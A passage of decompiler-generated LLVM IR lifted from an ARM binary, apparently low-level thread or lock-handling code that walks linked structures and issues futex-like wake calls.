  %v1_13884 = add i32 %v4_13880, 20
  store i32 %v1_13884, i32* %r2.global-to-local, align 4
  %v1_13888132 = inttoptr i32 %v1_13884 to i32*
  %v2_13888133 = load i32, i32* %v1_13888132, align 4
  store i32 %v2_13888133, i32* %r3.global-to-local, align 4
  %v3_1388c135 = icmp uge i32 %v2_13888133, %v3_1386c
  store i1 %v3_1388c135, i1* %cpsr_c.global-to-local, align 1
  %v9_1388c141 = icmp eq i32 %v2_13888133, %v3_1386c
  br i1 %v9_1388c141, label %dec_label_pc_13894, label %dec_label_pc_138ac

dec_label_pc_13894:                               ; preds = %dec_label_pc_13880, %dec_label_pc_13894.dec_label_pc_13888_crit_edge
  %v0_13894142 = phi i32 [ %v1_1388c.pre, %dec_label_pc_13894.dec_label_pc_13888_crit_edge ], [ %v3_1386c, %dec_label_pc_13880 ]
  store i32 %v0_13894142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_138a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_138a4, label %dec_label_pc_138a8, label %dec_label_pc_13894.dec_label_pc_13888_crit_edge

dec_label_pc_13894.dec_label_pc_13888_crit_edge:  ; preds = %dec_label_pc_13894
  %v0_13888.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1388c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13888 = inttoptr i32 %v0_13888.pre to i32*
  %v2_13888 = load i32, i32* %v1_13888, align 4
  store i32 %v2_13888, i32* %r3.global-to-local, align 4
  %v3_1388c = icmp uge i32 %v2_13888, %v1_1388c.pre
  store i1 %v3_1388c, i1* %cpsr_c.global-to-local, align 1
  %v9_1388c = icmp eq i32 %v2_13888, %v1_1388c.pre
  br i1 %v9_1388c, label %dec_label_pc_13894, label %dec_label_pc_138ac

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13894
  %v0_138a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_138ac

dec_label_pc_138ac:                               ; preds = %dec_label_pc_13880, %dec_label_pc_13894.dec_label_pc_13888_crit_edge, %dec_label_pc_138a8
  %v0_138ac = phi i32 [ %v0_138a8, %dec_label_pc_138a8 ], [ %v2_13888133, %dec_label_pc_13880 ], [ %v2_13888, %dec_label_pc_13894.dec_label_pc_13888_crit_edge ]
  %v1_138ac = phi i32 [ %v0_138a8, %dec_label_pc_138a8 ], [ %v3_1386c, %dec_label_pc_13880 ], [ %v1_1388c.pre, %dec_label_pc_13894.dec_label_pc_13888_crit_edge ]
  %v3_138ac = icmp uge i32 %v0_138ac, %v1_138ac
  store i1 %v3_138ac, i1* %cpsr_c.global-to-local, align 1
  %v9_138ac = icmp eq i32 %v0_138ac, %v1_138ac
  br i1 %v9_138ac, label %dec_label_pc_138b4, label %dec_label_pc_13930.backedge

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138ac
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_138c8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_138b8

dec_label_pc_138b8:                               ; preds = %dec_label_pc_13920, %dec_label_pc_138b4
  %v0_138b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_138b8 = add i32 %v0_138b8, 4
  %v2_138b8 = inttoptr i32 %v1_138b8 to i32*
  %v3_138b8 = load i32, i32* %v2_138b8, align 4
  store i32 %v3_138b8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_138bc = icmp eq i32 %v3_138b8, 0
  br i1 %v2_138bc, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_138b8
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_138b8, %bb
  %v2_138c4 = xor i1 %v2_138bc, true
  call void @__pseudo_cond_branch(i1 %v2_138c4, i32 %v3_138b8)
  %v0_138cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_138cc, i32* %stack_var_-88, align 4
  %v1_138d0 = inttoptr i32 %v0_138cc to i32*
  %v2_138d0 = load i32, i32* %v1_138d0, align 4
  store i32 %v2_138d0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_138d4 = icmp eq i32 %v2_138d0, 0
  store i32 %v2_138c8, i32* %r5.global-to-local, align 4
  br i1 %v2_138d4, label %dec_label_pc_13940.loopexit, label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %bb72
  %v1_138e8 = add i32 %v2_138d0, 20
  store i32 %v1_138e8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_138ec

dec_label_pc_138ec:                               ; preds = %dec_label_pc_13920.dec_label_pc_138ec_crit_edge, %dec_label_pc_138e8
  %v0_138f0 = phi i32 [ %v0_138f0.pre, %dec_label_pc_13920.dec_label_pc_138ec_crit_edge ], [ %v1_138e8, %dec_label_pc_138e8 ]
  %v0_138ec = phi i32 [ %v0_138ec.pre, %dec_label_pc_13920.dec_label_pc_138ec_crit_edge ], [ %v2_138d0, %dec_label_pc_138e8 ]
  %v1_138ec = add i32 %v0_138ec, 20
  %v2_138ec = inttoptr i32 %v1_138ec to i32*
  %v3_138ec = load i32, i32* %v2_138ec, align 4
  store i32 %v0_138f0, i32* %r2.global-to-local, align 4
  store i32 %v3_138ec, i32* %r4.global-to-local, align 4
  %v1_138fc119 = inttoptr i32 %v0_138f0 to i32*
  %v2_138fc120 = load i32, i32* %v1_138fc119, align 4
  store i32 %v2_138fc120, i32* %r3.global-to-local, align 4
  %v3_13900122 = icmp uge i32 %v2_138fc120, %v3_138ec
  store i1 %v3_13900122, i1* %cpsr_c.global-to-local, align 1
  %v9_13900128 = icmp eq i32 %v2_138fc120, %v3_138ec
  br i1 %v9_13900128, label %dec_label_pc_13908, label %dec_label_pc_13920

dec_label_pc_13908:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_13908.dec_label_pc_138fc_crit_edge
  %v0_13908129 = phi i32 [ %v1_13900.pre, %dec_label_pc_13908.dec_label_pc_138fc_crit_edge ], [ %v3_138ec, %dec_label_pc_138ec ]
  store i32 %v0_13908129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13918 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13918, label %dec_label_pc_1391c, label %dec_label_pc_13908.dec_label_pc_138fc_crit_edge

dec_label_pc_13908.dec_label_pc_138fc_crit_edge:  ; preds = %dec_label_pc_13908
  %v0_138fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13900.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_138fc = inttoptr i32 %v0_138fc.pre to i32*
  %v2_138fc = load i32, i32* %v1_138fc, align 4
  store i32 %v2_138fc, i32* %r3.global-to-local, align 4
  %v3_13900 = icmp uge i32 %v2_138fc, %v1_13900.pre
  store i1 %v3_13900, i1* %cpsr_c.global-to-local, align 1
  %v9_13900 = icmp eq i32 %v2_138fc, %v1_13900.pre
  br i1 %v9_13900, label %dec_label_pc_13908, label %dec_label_pc_13920

dec_label_pc_1391c:                               ; preds = %dec_label_pc_13908
  %v0_1391c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1391c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13920

dec_label_pc_13920:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_13908.dec_label_pc_138fc_crit_edge, %dec_label_pc_1391c
  %v0_13920 = phi i32 [ %v0_1391c, %dec_label_pc_1391c ], [ %v2_138fc120, %dec_label_pc_138ec ], [ %v2_138fc, %dec_label_pc_13908.dec_label_pc_138fc_crit_edge ]
  %v1_13920 = phi i32 [ %v0_1391c, %dec_label_pc_1391c ], [ %v3_138ec, %dec_label_pc_138ec ], [ %v1_13900.pre, %dec_label_pc_13908.dec_label_pc_138fc_crit_edge ]
  %v3_13920 = icmp uge i32 %v0_13920, %v1_13920
  store i1 %v3_13920, i1* %cpsr_c.global-to-local, align 1
  %v9_13920 = icmp eq i32 %v0_13920, %v1_13920
  store i32 %v2_138c8, i32* %r4.global-to-local, align 4
  br i1 %v9_13920, label %dec_label_pc_138b8, label %dec_label_pc_13920.dec_label_pc_138ec_crit_edge

dec_label_pc_13920.dec_label_pc_138ec_crit_edge:  ; preds = %dec_label_pc_13920
  %v0_138ec.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_138f0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_138ec

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13930.backedge, %entry
  %v0_1394431 = phi i32 [ ptrtoint (i32* @global_var_21698.346 to i32), %entry ], [ %v0_13930, %dec_label_pc_13930.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13940

dec_label_pc_13940.loopexit:                      ; preds = %bb72
  store i32 %v2_138c8, i32* %r6.global-to-local, align 4
  %v0_13944.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13940

dec_label_pc_13940:                               ; preds = %dec_label_pc_13940.loopexit, %dec_label_pc_1393c
  %v0_13944 = phi i32 [ %v0_13944.pre, %dec_label_pc_13940.loopexit ], [ %v0_1394431, %dec_label_pc_1393c ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13944 = add i32 %v0_13944, 152
  %v3_13944 = inttoptr i32 %v2_13944 to i32*
  %v4_13944 = load i32, i32* %v3_13944, align 4
  store i32 %v4_13944, i32* %r7.global-to-local, align 4
  %v0_13948 = call i32 @__aeabi_read_tp()
  store i32 %v0_13948, i32* %r0.global-to-local, align 4
  %v1_1394c = add i32 %v4_13944, 8
  %v2_1394c = inttoptr i32 %v1_1394c to i32*
  %v3_1394c = load i32, i32* %v2_1394c, align 4
  store i32 %v3_1394c, i32* %r3.global-to-local, align 4
  %v1_13950 = add i32 %v0_13948, -1168
  store i32 %v1_13950, i32* %r5.global-to-local, align 4
  %v3_13954 = icmp uge i32 %v3_1394c, %v1_13950
  store i1 %v3_13954, i1* %cpsr_c.global-to-local, align 1
  %v9_13954 = icmp eq i32 %v3_1394c, %v1_13950
  br i1 %v9_13954, label %dec_label_pc_13abc, label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13940
  store i32 %v4_13944, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13968112 = inttoptr i32 %v4_13944 to i32*
  %v2_13968113 = load i32, i32* %v1_13968112, align 4
  store i32 %v2_13968113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1396c115 = icmp eq i32 %v2_13968113, 0
  br i1 %v9_1396c115, label %dec_label_pc_13974, label %dec_label_pc_1398c

dec_label_pc_13974:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_13974.dec_label_pc_13968_crit_edge
  %v0_13974116 = phi i32 [ %v1_1396c.pre, %dec_label_pc_13974.dec_label_pc_13968_crit_edge ], [ 0, %dec_label_pc_1395c ]
  store i32 %v0_13974116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13984 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13984, label %dec_label_pc_13988, label %dec_label_pc_13974.dec_label_pc_13968_crit_edge

dec_label_pc_13974.dec_label_pc_13968_crit_edge:  ; preds = %dec_label_pc_13974
  %v0_13968.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1396c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13968 = inttoptr i32 %v0_13968.pre to i32*
  %v2_13968 = load i32, i32* %v1_13968, align 4
  store i32 %v2_13968, i32* %r3.global-to-local, align 4
  %v3_1396c = icmp uge i32 %v2_13968, %v1_1396c.pre
  store i1 %v3_1396c, i1* %cpsr_c.global-to-local, align 1
  %v9_1396c = icmp eq i32 %v2_13968, %v1_1396c.pre
  br i1 %v9_1396c, label %dec_label_pc_13974, label %dec_label_pc_1398c

dec_label_pc_13988:                               ; preds = %dec_label_pc_13974
  %v0_13988 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13988, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1398c

dec_label_pc_1398c:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_13974.dec_label_pc_13968_crit_edge, %dec_label_pc_13988
  %v0_1398c = phi i32 [ %v0_13988, %dec_label_pc_13988 ], [ %v2_13968113, %dec_label_pc_1395c ], [ %v2_13968, %dec_label_pc_13974.dec_label_pc_13968_crit_edge ]
  %v1_1398c = phi i32 [ %v0_13988, %dec_label_pc_13988 ], [ 0, %dec_label_pc_1395c ], [ %v1_1396c.pre, %dec_label_pc_13974.dec_label_pc_13968_crit_edge ]
  %v3_1398c = icmp uge i32 %v0_1398c, %v1_1398c
  store i1 %v3_1398c, i1* %cpsr_c.global-to-local, align 1
  %v9_1398c = icmp eq i32 %v0_1398c, %v1_1398c
  br i1 %v9_1398c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_1398c
  %v1_13990 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13990, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_1398c, %bb73
  %v1_13994 = xor i1 %v9_1398c, true
  call void @__pseudo_cond_branch(i1 %v1_13994, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_13998 = load i32, i32* %r5.global-to-local, align 4
  %v1_13998 = load i32, i32* %r7.global-to-local, align 4
  %v2_13998 = add i32 %v1_13998, 8
  %v3_13998 = inttoptr i32 %v2_13998 to i32*
  store i32 %v0_13998, i32* %v3_13998, align 4
  br label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %bb74, %dec_label_pc_13940
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_139a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_139a0 = add i32 %v0_139a0, 152
  %v3_139a0 = inttoptr i32 %v2_139a0 to i32*
  %v4_139a0 = load i32, i32* %v3_139a0, align 4
  store i32 %v4_139a0, i32* %r2.global-to-local, align 4
  %v1_139a4 = add i32 %v4_139a0, 4
  %v2_139a4 = inttoptr i32 %v1_139a4 to i32*
  %v3_139a4 = load i32, i32* %v2_139a4, align 4
  %v1_139a8 = add i32 %v3_139a4, 1
  store i32 %v1_139a8, i32* %r3.global-to-local, align 4
  store i32 %v1_139a8, i32* %v2_139a4, align 4
  %v0_139b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_139b0 = add i32 %v0_139b0, 108
  %v2_139b0 = inttoptr i32 %v1_139b0 to i32*
  %v3_139b0 = load i32, i32* %v2_139b0, align 4
  store i32 %v3_139b0, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_139b8 = sub i32 0, %v3_139b0
  store i32 %v1_139b8, i32* %v2_139b0, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_139cc = load i32, i32* %r5.global-to-local, align 4
  %v1_139cc = add i32 %v0_139cc, 104
  store i32 %v1_139cc, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_13ac0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13ac0 = add i32 %v0_139cc, 108
  %v3_13ac0 = inttoptr i32 %v2_13ac0 to i32*
  store i32 %v0_13ac0.pre, i32* %v3_13ac0, align 4
  %v0_13ac4 = load i32, i32* %r8.global-to-local, align 4
  %v1_13ac4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13ac4 = add i32 %v1_13ac4, %v0_13ac4
  %v3_13ac4 = inttoptr i32 %v2_13ac4 to i32*
  %v4_13ac4 = load i32, i32* %v3_13ac4, align 4
  store i32 %v4_13ac4, i32* %r0.global-to-local, align 4
  %v1_13ac8 = add i32 %v4_13ac4, 4
  %v2_13ac8 = inttoptr i32 %v1_13ac8 to i32*
  %v3_13ac8 = load i32, i32* %v2_13ac8, align 4
  %v1_13acc = add i32 %v3_13ac8, -1
  store i32 %v1_13acc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ad0 = icmp eq i32 %v1_13acc, 0
  store i32 %v1_13acc, i32* %v2_13ac8, align 4
  br i1 %v2_13ad0, label %dec_label_pc_13adc, label %dec_label_pc_13bccthread-pre-split

dec_label_pc_13adc:                               ; preds = %dec_label_pc_13abc
  %v0_13adc = load i32, i32* %r3.global-to-local, align 4
  %v1_13adc = load i32, i32* %r0.global-to-local, align 4
  %v2_13adc = add i32 %v1_13adc, 8
  %v3_13adc = inttoptr i32 %v2_13adc to i32*
  store i32 %v0_13adc, i32* %v3_13adc, align 4
  %v0_13ae0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13ae0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13b14.dec_label_pc_13ae4_crit_edge, %dec_label_pc_13adc
  %v0_13ae4 = phi i32 [ %v0_13ae4.pre, %dec_label_pc_13b14.dec_label_pc_13ae4_crit_edge ], [ %v0_13ae0, %dec_label_pc_13adc ]
  %v1_13ae4 = inttoptr i32 %v0_13ae4 to i32*
  %v2_13ae4 = load i32, i32* %v1_13ae4, align 4
  store i32 %v2_13ae4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13ae4, i32* %r2.global-to-local, align 4
  %v2_13af0100 = load i32, i32* %v1_13ae4, align 4
  store i32 %v2_13af0100, i32* %r3.global-to-local, align 4
  %v3_13af4102 = icmp uge i32 %v2_13af0100, %v2_13ae4
  store i1 %v3_13af4102, i1* %cpsr_c.global-to-local, align 1
  %v9_13af4108 = icmp eq i32 %v2_13af0100, %v2_13ae4
  br i1 %v9_13af4108, label %dec_label_pc_13afc, label %dec_label_pc_13b14

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13ae4, %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge
  %v0_13afc109 = phi i32 [ %v1_13af4.pre, %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge ], [ %v2_13ae4, %dec_label_pc_13ae4 ]
  store i32 %v0_13afc109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13b0c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13b0c, label %dec_label_pc_13b10, label %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge

dec_label_pc_13afc.dec_label_pc_13af0_crit_edge:  ; preds = %dec_label_pc_13afc
  %v0_13af0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13af4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13af0 = inttoptr i32 %v0_13af0.pre to i32*
  %v2_13af0 = load i32, i32* %v1_13af0, align 4
  store i32 %v2_13af0, i32* %r3.global-to-local, align 4
  %v3_13af4 = icmp uge i32 %v2_13af0, %v1_13af4.pre
  store i1 %v3_13af4, i1* %cpsr_c.global-to-local, align 1
  %v9_13af4 = icmp eq i32 %v2_13af0, %v1_13af4.pre
  br i1 %v9_13af4, label %dec_label_pc_13afc, label %dec_label_pc_13b14

dec_label_pc_13b10:                               ; preds = %dec_label_pc_13afc
  %v0_13b10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %dec_label_pc_13ae4, %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge, %dec_label_pc_13b10
  %v0_13b1c = phi i32 [ %v0_13b10, %dec_label_pc_13b10 ], [ %v2_13af0100, %dec_label_pc_13ae4 ], [ %v2_13af0, %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge ]
  %v1_13b14 = phi i32 [ %v0_13b10, %dec_label_pc_13b10 ], [ %v2_13ae4, %dec_label_pc_13ae4 ], [ %v1_13af4.pre, %dec_label_pc_13afc.dec_label_pc_13af0_crit_edge ]
  %v3_13b14 = icmp uge i32 %v0_13b1c, %v1_13b14
  store i1 %v3_13b14, i1* %cpsr_c.global-to-local, align 1
  %v9_13b14 = icmp eq i32 %v0_13b1c, %v1_13b14
  br i1 %v9_13b14, label %dec_label_pc_13b1c, label %dec_label_pc_13b14.dec_label_pc_13ae4_crit_edge

dec_label_pc_13b14.dec_label_pc_13ae4_crit_edge:  ; preds = %dec_label_pc_13b14
  %v0_13ae4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13ae4

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13b14
  %v2_13b1c = icmp ne i32 %v1_13b14, 0
  store i1 %v2_13b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_13b20 = icmp slt i32 %v1_13b14, 2
  br i1 %v7_13b20, label %dec_label_pc_13bccthread-pre-split, label %dec_label_pc_13b24

dec_label_pc_13b24:                               ; preds = %dec_label_pc_13b1c
  %v0_13b24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13b24, i32* %r0.global-to-local, align 4
  %v0_13b28 = load i32, i32* @r1, align 4
  %v1_13b28 = add i32 %v0_13b28, 129
  store i32 %v1_13b28, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13bccthread-pre-split

dec_label_pc_13b40:                               ; preds = %dec_label_pc_13bccthread-pre-split, %dec_label_pc_13bc8
  %v0_13b40 = phi i32 [ %v3_13bc8, %dec_label_pc_13bc8 ], [ %v0_13bcc.pr, %dec_label_pc_13bccthread-pre-split ]
  %v1_13b40 = inttoptr i32 %v0_13b40 to i32*
  %v2_13b40 = load i32, i32* %v1_13b40, align 4
  store i32 %v2_13b40, i32* %r3.global-to-local, align 4
  %v1_13b44 = add i32 %v2_13b40, 8
  %v2_13b44 = inttoptr i32 %v1_13b44 to i32*
  %v3_13b44 = load i32, i32* %v2_13b44, align 4
  store i32 %v3_13b44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13b48 = icmp eq i32 %v3_13b44, 0
  br i1 %v2_13b48, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_13b40
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_13b40, %bb75
  %v2_13b50 = xor i1 %v2_13b48, true
  call void @__pseudo_cond_branch(i1 %v2_13b50, i32 %v3_13b44)
  %v0_13b54 = load i32, i32* %r6.global-to-local, align 4
  %v1_13b54 = inttoptr i32 %v0_13b54 to i32*
  %v2_13b54 = load i32, i32* %v1_13b54, align 4
  store i32 %v2_13b54, i32* %r5.global-to-local, align 4
  %v1_13b58 = add i32 %v2_13b54, 20
  store i32 %v1_13b58, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b90.dec_label_pc_13b5c_crit_edge, %bb76
  %v0_13b60 = phi i32 [ %v0_13b60.pre, %dec_label_pc_13b90.dec_label_pc_13b5c_crit_edge ], [ %v1_13b58, %bb76 ]
  %v0_13b5c = phi i32 [ %v0_13b5c.pre, %dec_label_pc_13b90.dec_label_pc_13b5c_crit_edge ], [ %v2_13b54, %bb76 ]
  %v1_13b5c = add i32 %v0_13b5c, 20
  %v2_13b5c = inttoptr i32 %v1_13b5c to i32*
  %v3_13b5c = load i32, i32* %v2_13b5c, align 4
  store i32 %v0_13b60, i32* %r2.global-to-local, align 4
  store i32 %v3_13b5c, i32* %r4.global-to-local, align 4
  %v1_13b68 = add i32 %v3_13b5c, -1
  store i32 %v1_13b68, i32* @r1, align 4
  %v1_13b6c87 = inttoptr i32 %v0_13b60 to i32*
  %v2_13b6c88 = load i32, i32* %v1_13b6c87, align 4
  store i32 %v2_13b6c88, i32* %r3.global-to-local, align 4
  %v3_13b7090 = icmp uge i32 %v2_13b6c88, %v3_13b5c
  store i1 %v3_13b7090, i1* %cpsr_c.global-to-local, align 1
  %v9_13b7096 = icmp eq i32 %v2_13b6c88, %v3_13b5c
  br i1 %v9_13b7096, label %dec_label_pc_13b78, label %dec_label_pc_13b90

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b5c, %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge
  %v0_13b7897 = phi i32 [ %v1_13b70.pre, %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge ], [ %v3_13b5c, %dec_label_pc_13b5c ]
  store i32 %v0_13b7897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13b88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13b88, label %dec_label_pc_13b8c, label %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge

dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge:  ; preds = %dec_label_pc_13b78
  %v0_13b6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13b70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13b6c = inttoptr i32 %v0_13b6c.pre to i32*
  %v2_13b6c = load i32, i32* %v1_13b6c, align 4
  store i32 %v2_13b6c, i32* %r3.global-to-local, align 4
  %v3_13b70 = icmp uge i32 %v2_13b6c, %v1_13b70.pre
  store i1 %v3_13b70, i1* %cpsr_c.global-to-local, align 1
  %v9_13b70 = icmp eq i32 %v2_13b6c, %v1_13b70.pre
  br i1 %v9_13b70, label %dec_label_pc_13b78, label %dec_label_pc_13b90

dec_label_pc_13b8c:                               ; preds = %dec_label_pc_13b78
  %v0_13b8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13b5c, %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge, %dec_label_pc_13b8c
  %v0_13b9c = phi i32 [ %v0_13b8c, %dec_label_pc_13b8c ], [ %v2_13b6c88, %dec_label_pc_13b5c ], [ %v2_13b6c, %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge ]
  %v1_13b90 = phi i32 [ %v0_13b8c, %dec_label_pc_13b8c ], [ %v3_13b5c, %dec_label_pc_13b5c ], [ %v1_13b70.pre, %dec_label_pc_13b78.dec_label_pc_13b6c_crit_edge ]
  %v3_13b90 = icmp uge i32 %v0_13b9c, %v1_13b90
  store i1 %v3_13b90, i1* %cpsr_c.global-to-local, align 1
  %v9_13b90 = icmp eq i32 %v0_13b9c, %v1_13b90
  store i32 %v0_13b9c, i32* %r2.global-to-local, align 4
  br i1 %v9_13b90, label %dec_label_pc_13b9c, label %dec_label_pc_13b90.dec_label_pc_13b5c_crit_edge

dec_label_pc_13b90.dec_label_pc_13b5c_crit_edge:  ; preds = %dec_label_pc_13b90
  %v0_13b5c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_13b60.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b5c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b90
  %v2_13b9c = icmp ne i32 %v1_13b90, 0
  store i1 %v2_13b9c, i1* %cpsr_c.global-to-local, align 1
  %v7_13b9c = icmp eq i32 %v1_13b90, 1
  %v0_13ba4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_13b9c, label %dec_label_pc_13ba4, label %dec_label_pc_13bc8

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b9c
  %v1_13ba4 = inttoptr i32 %v0_13ba4 to i32*
  %v2_13ba4 = load i32, i32* %v1_13ba4, align 4
  store i32 %v2_13ba4, i32* @r1, align 4
  %v1_13ba8 = add i32 %v2_13ba4, 24
  %v2_13ba8 = inttoptr i32 %v1_13ba8 to i32*
  %v3_13ba8 = load i32, i32* %v2_13ba8, align 4
  store i32 %v3_13ba8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bac = icmp eq i32 %v3_13ba8, 0
  br i1 %v2_13bac, label %dec_label_pc_13bc8, label %dec_label_pc_13bb4

dec_label_pc_13bb4:                               ; preds = %dec_label_pc_13ba4
  %v1_13bb4 = add i32 %v2_13ba4, 20
  %v2_13bb4 = inttoptr i32 %v1_13bb4 to i32*
  %v3_13bb4 = load i32, i32* %v2_13bb4, align 4
  store i32 %v3_13bb4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13bc8

dec_label_pc_13bc8:                               ; preds = %dec_label_pc_13b9c, %dec_label_pc_13bb4, %dec_label_pc_13ba4
  %v1_13bc8 = add i32 %v0_13ba4, 4
  %v2_13bc8 = inttoptr i32 %v1_13bc8 to i32*
  %v3_13bc8 = load i32, i32* %v2_13bc8, align 4
  store i32 %v3_13bc8, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bcc = icmp eq i32 %v3_13bc8, 0
  br i1 %v2_13bcc, label %dec_label_pc_13bd4, label %dec_label_pc_13b40

dec_label_pc_13bccthread-pre-split:               ; preds = %dec_label_pc_13b24, %dec_label_pc_13b1c, %dec_label_pc_13abc
  %v0_13bcc.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bcc11 = icmp eq i32 %v0_13bcc.pr, 0
